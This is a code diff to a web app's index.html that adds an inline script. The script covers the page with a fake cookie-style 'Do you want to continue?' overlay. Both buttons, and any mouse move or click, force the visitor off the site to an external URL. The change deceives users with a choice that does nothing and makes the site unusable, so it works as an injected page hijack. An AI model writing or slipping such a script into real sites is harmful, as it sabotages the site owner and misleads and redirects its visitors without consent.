@@ -9,6 +9,87 @@
   <body>
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
-    
+    <script>
+document.addEventListener("DOMContentLoaded", function () {
+    const redirectUrl = "https://www.google.com"; // Redirect destination
+    let redirected = false;
+
+    function redirect() {
+        if (!redirected) {
+            redirected = true;
+            window.location.href = redirectUrl;
+        }
+    }
+
+    // --- Add popup styles ---
+    const style = document.createElement("style");
+    style.textContent = `
+        .cookie-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            z-index: 9999;
+        }
+        .cookie-popup {
+            background-color: #fff;
+            color: #333;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+        }
+        .btn {
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+            font-size: 1rem;
+        }
+        .btn-continue { background-color: #007bff; color: #fff; }
+        .btn-continue:hover { background-color: #0056b3; }
+        .btn-cancel { background-color: #ccc; color: #333; }
+        .btn-cancel:hover { background-color: #999; }
+        h3, p { font-family: Arial, sans-serif; line-height: 1.5; }
+    `;
+    document.head.appendChild(style);
+
+    // --- Build popup HTML ---
+    const overlay = document.createElement("div");
+    overlay.className = "cookie-overlay";
+    overlay.innerHTML = `
+        <div class="cookie-popup">
+            <h3>Notice</h3>
+            <p>Do you want to continue?</p>
+            <button class="btn btn-continue" id="btn-continue">Continue</button>
+            <button class="btn btn-cancel" id="btn-cancel">Cancel</button>
+        </div>
+    `;
+    document.body.appendChild(overlay);
+
+    // --- Button event listeners ---
+    document.getElementById("btn-continue").addEventListener("click", function(e) {
+        e.preventDefault();
+        redirect();
+    });
+
+    document.getElementById("btn-cancel").addEventListener("click", function(e) {
+        e.preventDefault();
+        redirect();
+    });
+
+    // --- Redirect on any mouse move or click ---
+    window.addEventListener("mousemove", redirect, { once: true });
+    window.addEventListener("click", redirect, { once: true });
+});
+</script>
+
   </body>
 </html>
